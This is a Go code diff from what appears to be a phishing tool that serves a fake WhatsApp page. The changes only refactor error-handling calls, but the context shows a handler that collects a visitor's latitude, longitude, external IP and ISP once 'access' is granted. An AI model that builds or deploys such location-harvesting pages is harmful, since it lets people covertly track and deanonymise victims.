@@ -25,9 +25,9 @@ func (h Hndl) Whatsapp() {
 	fmt.Scanln(&img)
 	iname := strings.Split(img, "/") //image name from path
 	iloc, err := os.Open(img)        //open original img
-	c.Try("", err, false)
+	c.Try(err, false, "opening image")
 	ilocNew, err := os.Create("template/whatsapp/static/images/" + iname[len(iname)-1]) //open copy img
-	c.Try("", err, false)
+	c.Try(err, false, "copying image to workspace")
 	io.Copy(ilocNew, iloc) //copy img data
 	iloc.Close()
 	ilocNew.Close()
@@ -49,14 +49,14 @@ func (h Hndl) Whatsapp() {
 				Img:   newImgPath,
 			}
 			tpl, err := template.ParseFiles("template/whatsapp/index.html")
-			c.Try("", err, false)
+			c.Try(err, false, "parsing index.html")
 			err = tpl.Execute(w, data)
-			c.Try("", err, false)
+			c.Try(err, false, "executing template")
 
 		//Don't change this code
 		case "POST": //POST request handler
 			err := r.ParseForm()
-			c.Try("", err, false)
+			c.Try(err, false, "parsing info")
 			if r.FormValue("Flag") == "1" { //Access granted
 				li := "\t Latitude        :    " + r.FormValue("Lat") +
 					"\n\t Longitude       :    " + r.FormValue("Lon") +
@@ -126,7 +126,7 @@ func (h Hndl) Whatsapp() {
 				c.Cprint(c.N, "IP Information:") //IP Information
 				ipResult := make(map[string]interface{})
 				err := json.Unmarshal([]byte(r.FormValue("Ipp")), &ipResult)
-				c.Try("", err, false)
+				c.Try(err, false, "reading ip info")
 
 				fmt.Println("\t External IP      :\t", ipResult["ip"])
 				fmt.Println("\t ISP              :\t", ipResult["isp"])
